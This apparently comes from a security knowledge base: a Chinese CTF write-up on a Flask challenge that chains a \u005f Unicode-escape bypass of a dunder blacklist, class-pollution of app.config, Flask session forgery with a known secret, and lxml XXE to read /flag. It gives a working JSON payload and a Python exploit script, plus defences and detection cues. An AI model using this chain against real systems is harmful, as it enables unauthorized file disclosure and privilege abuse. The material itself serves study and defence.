---
id: web-python-framework-json-unicode-dunder-blacklist-bypass-config-xml-xxe
title: JSON 里的 \u005f 绕过 dunder 黑名单：污染 Flask app.config 的 XML 串，再用本地路径实体读文件
type: scenario
domain: web
path: web/python/framework
technique: json-unicode-escape-dunder-filter-bypass-config-pollution-xxe
tags:
- python
- flask
- prototype-pollution
- unicode
- waf-bypass
- xxe
- lxml
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:53:25+08:00'
  notes: 已对照原文核对；本次核对未读取图片；pyc 反编译出的 /update 与 /xml_parse 源码与卡内描述一致：check(request.data) 在 json.loads 之前对原始 bytes 做 __class__/__init__/__globals__ 子串黑名单，第二层过滤禁 static/dtd/file/environ，lxml 用 load_dtd=True、resolve_entities=True 解析 app.config[xml_data] 并 tostring 回显；正文最终成功的 payload 正是 _\u005finit__ 与 _\u005fglobals__ 链加 SYSTEM 绝对路径 /flag 实体（不出现 file 关键字）；与既有卡 web-generic-xxe-lxml-config-xml-pollution 的 UTF-16BE 值级绕过属同题不同绕过点，保留；PoC 未对真实目标执行
url: /docs/web/python/framework/web-python-framework-json-unicode-dunder-blacklist-bypass-config-xml-xxe/
draft: false
kb_aliases:
- \u005finit__ 绕过 __init__ 过滤
- dunder 黑名单 unicode 绕过
- 原型链污染打 XXE
- app.config xml_data 污染
- 绕过 file/dtd 关键字读 flag
---

## 一句话结论

当 Flask 应用有一个递归 `update(src, dst)`“设属性/设键”的接口、并对原始请求体做 `__class__`/`__init__`/`__globals__` 的子串黑名单时，黑名单挡的是**字面量**而不是**语义**：把 JSON 里的下划线写成 `\u005f`，`json.loads` 解析后内存里仍是 `__init__`，但字节流里不含被禁子串，于是污染照样成功；再把 `app.config['xml_data']` 换成带 `SYSTEM` 实体的 XML，配合 `/xml_parse` 的 `lxml`（`load_dtd=True, resolve_entities=True`）即可读任意文件。第二层过滤（禁 `file`/`dtd`/`static`/`environ`）也能绕：实体值直接写绝对路径 `/flag`，不需要 `file://` 前缀。

## 原理

- **两层过滤都在“字节”层**：`check(request.data)` 是在 `json.loads` **之前**对原始 bytes 做 `in` 判断，所以只认字面量；JSON 规范允许 `\u005f` 表示 `_`，转义在解析阶段才还原。这是“过滤器看输入、业务看解析结果”的经典错位。
- **污染路径是从函数对象爬回应用**：`update` 的第一层用 `hasattr(dst, k)` / `setattr(dst, k, v)`，从 `User` **类对象**出发，`__init__` 是函数，`__init__.__globals__` 是模块全局命名空间，里面有 `app`，`app.config` 是 dict-like，最后一层 `dst[k] = v` 直接写入 `config['xml_data']`。
- **注入点与 sink 分离**：污染在 `/update`（需要 admin session），解析在 `/xml_parse`（无需参数，直接读 `app.config['xml_data']`）。单看任一接口都不像漏洞，必须把两者连起来。
- **XXE 在 lxml 默认配置下成立**：`etree.XMLParser(load_dtd=True, resolve_entities=True)` 会加载 DOCTYPE 并展开实体，`etree.tostring` 又把展开后的内容序列化返回，于是文件内容直接回显。
- **第二层过滤是“关键字”而非“能力”**：`"static"`, `"dtd"`, `"file"`, `"environ"` 只针对常见写法（`file:///flag`、`SYSTEM "file://..."`、`/proc/self/environ`）。把实体的 SYSTEM 值写成绝对路径 `/flag` 即可：libxml2 对没有 scheme 的路径按本地文件处理，`file` 关键字根本不出现。

## 触发条件

- 存在把用户 JSON 递归并入对象/字典的接口（`update`/`merge`/`setattr` 递归），且入口对象能爬到模块全局（如从类对象出发，或 `__init__.__globals__` 可达）。
- 过滤是对原始请求体做子串匹配，而非解析后对键做白名单。
- 另有一个路由用 `lxml`/`xml.dom.minidom` 等解析来自配置/数据库的 XML，且开启了 DTD 与实体解析。
- 需要 admin 权限时，session 密钥可被猜到/伪造（本题 `app.secret_key = "a123456"`，可自行签发 Flask session）。

## 利用步骤

1. 读源码确认三件事：`update` 的递归形态、黑名单内容、以及哪个路由解析 XML（本题 `/xml_parse`）。
2. 若需 admin，先用已知/猜到的 `secret_key` 自行签发 Flask session（`{"username":"admin"}`），或用弱口令登录后台。
3. 构造污染 JSON：键名里的下划线用 `\u005f` 转义；值里放恶意 XML（`<!DOCTYPE note [<!ENTITY x SYSTEM "/flag">]>...&x;`），实体值用绝对路径避开 `file` 关键字。
4. POST 到污染接口，确认返回“更新成功”。
5. GET `/xml_parse`，响应 XML 中 `<username>` 位置即文件内容。

## PoC

```json
{
    "_\u005finit__": {
        "_\u005fglobals__": {
            "app": {
                "config": {
                    "xml_data": "<?xml version=\"1.0\"?>\n<!DOCTYPE note [\n<!ENTITY x SYSTEM \"/flag\">\n]>\n<user><username>&x;</username></user>"
                }
            }
        }
    }
}
```

```python
import requests, re
from flask.sessions import SecureCookieSessionInterface

# 1) 用已知 secret_key 自行签发 admin session（本题 app.secret_key = "a123456"）
#    实际可用 flask-unsign --sign --cookie '{"username":"admin"}' --secret a123456
sess = "<flask session cookie signed with a123456>"

payload = {
    "_\u005finit__": {
        "_\u005fglobals__": {
            "app": {"config": {"xml_data":
                '<?xml version="1.0"?>\n<!DOCTYPE note [\n<!ENTITY x SYSTEM "/flag">\n]>\n'
                '<user><username>&x;</username></user>'}}
        }
    }
}
r = requests.post("http://target/update", json=payload, cookies={"session": sess})
print(r.status_code, r.text)          # 期望 {"message": "更新成功"}

r = requests.get("http://target/xml_parse")
print(re.search(r"<username>(.*?)</username>", r.text, re.S).group(1))
```

说明：`\u005f` 转义在 JSON 文本里保留、在解析后还原为下划线；原文用同一 payload 打通，但 flag 内容的截图未在正文（正文仅说明“直接 /flag 可以”）。

## 变体与关联

- **转义变体**：`\u005f`、`\u005F`、`\u{5f}`（若解析器支持）、UTF-8 百分号编码 `%5f`、双写 `__ini\nt__`（若过滤器不规范化换行）。
- **爬链变体**：`__init__.__globals__` 之外还有 `__class__.__init__.__globals__`、`__globals__['app']`、`__builtins__`；键名可用列表形式 `["__init__"]` 在部分 merge 实现里绕过字符串键匹配。
- **sink 变体**：XML 解析换成 `yaml.load`、`pickle.loads`、模板字符串（SSTI）、`subprocess` 参数；污染目标换成 `config['SECRET_KEY']`（伪造 session）、`config['SQLALCHEMY_DATABASE_URI']`。
- **关联**：`web-generic-xxe-lxml-config-xml-pollution`（同一挑战的 XXE 侧，本卡补的是黑名单绕过与绝对路径写法）、`web-nodejs-prototype-pollution-merge-json-parse`（JS 侧同构的 merge 污染）、`web-python-framework-flask-route-registration-memshell`（拿到代码执行后的驻留）。
- **边界**：`update` 用白名单键、或过滤在 `json.loads` 之后对键名比对时失效；`lxml` 关闭 `resolve_entities`（或 lxml ≥5 默认更严格）时 XXE 不成立；无法获得 admin session 且无弱口令时前置不成立。

## 检测与防御

- **解析后再校验**：对**解析后的对象**做键名白名单（禁止 `__` 开头的键、禁止 `config`/`globals` 路径），而不是对原始字节做子串黑名单。
- **禁止递归 setattr**：`update` 只允许写入显式的字段集合（`allowed = {'email','nickname'}`），且只对数据对象操作，不从类/函数对象出发。
- **XML 解析加固**：`etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)`，或改用 `defusedxml`；不要解析来自配置/数据库的“看起来可信”的 XML。
- **session 安全**：`SECRET_KEY` 必须随机且不入库明文、不硬编码；开启 `SESSION_COOKIE_HTTPONLY/SECURE`。
- **检测**：请求体出现 `\u005f`、`\u005F`、`%5f` 等转义下划线；JSON 键名在解析后含 `__init__`/`__globals__`；`/update` 与 `/xml_parse` 在短时间内被同一会话连续调用；响应 XML 中出现 DOCTYPE/ENTITY。
